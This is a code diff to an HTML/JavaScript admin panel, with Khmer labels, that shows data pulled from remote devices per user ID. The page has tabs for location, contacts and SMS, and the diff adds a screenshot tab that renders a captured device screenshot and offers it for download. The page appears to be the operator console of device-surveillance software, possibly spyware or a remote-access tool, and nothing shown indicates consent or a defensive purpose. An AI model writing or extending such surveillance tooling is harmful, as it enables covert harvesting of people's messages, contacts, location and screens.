@@ -356,6 +356,7 @@
 
   <div class="tabs">
     <button class="tab-btn active" data-tab="location">📍 ទីតាំង</button>
+    <button class="tab-btn" data-tab="screenshot">📸 Screenshot</button>
     <button class="tab-btn" data-tab="contacts">👥 Contacts</button>
     <button class="tab-btn" data-tab="sms">💬 SMS</button>
   </div>
@@ -363,6 +364,10 @@
   <div id="location-tab" class="tab-content active">
     <div class="stats" id="locationStats"></div>
     <div id="locationContent"></div>
+  </div>
+
+  <div id="screenshot-tab" class="tab-content">
+    <div id="screenshotContent"></div>
   </div>
 
   <div id="contacts-tab" class="tab-content">
@@ -443,11 +448,13 @@ async function loadData() {
     const commands = await api(`/device/commands?user_id=${userId}&limit=200`);
     
     const locationCmd = commands.find(c => c.command_type === 'get_location' && c.result_data);
+    const screenshotCmd = commands.find(c => c.command_type === 'screenshot' && c.result_data);
     const contactsCmd = commands.find(c => c.command_type === 'get_contacts' && c.result_data);
     const smsCmd = commands.find(c => c.command_type === 'get_sms' && c.result_data);
     
     commandData = {
       location: locationCmd?.result_data,
+      screenshot: screenshotCmd?.result_data,
       contacts: contactsCmd?.result_data,
       sms: smsCmd?.result_data,
     };
@@ -455,6 +462,7 @@ async function loadData() {
     document.getElementById('pageMeta').textContent = `User ID: ${userId}`;
     
     renderLocation();
+    renderScreenshot();
     renderContacts();
     renderSMS();
     
@@ -514,6 +522,30 @@ function renderLocation() {
         <div class="location-label">ប្រទេស</div>
         <div class="location-value">${esc(data.country || '—')}</div>
       </div>
+    </div>
+  `;
+}
+
+function renderScreenshot() {
+  const data = commandData.screenshot;
+  if (!data) {
+    document.getElementById('screenshotContent').innerHTML = `
+      <div class="empty">
+        <div class="empty-icon">📸</div>
+        <div class="empty-text">មិនមាន screenshot<br>សូមចុច 📸 Screenshot ក្នុង admin panel</div>
+      </div>
+    `;
+    return;
+  }
+  
+  const imgData = data.image || data.screenshot;
+  const ts = data.timestamp || '';
+  
+  document.getElementById('screenshotContent').innerHTML = `
+    <div style="text-align:center;padding:20px">
+      ${ts ? `<p style="margin-bottom:16px;color:#888;font-size:13px">📸 ថតនៅ: ${esc(ts)}</p>` : ''}
+      ${imgData ? `<img src="data:image/png;base64,${imgData}" style="max-width:100%;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15)" />` : '<p>គ្មានរូបភាព</p>'}
+      ${imgData ? `<div style="margin-top:20px"><a href="data:image/png;base64,${imgData}" download="screenshot_${userId}_${Date.now()}.png" class="tab-btn" style="text-decoration:none;color:#667eea">⬇️ ទាញយករូបភាព</a></div>` : ''}
     </div>
   `;
 }
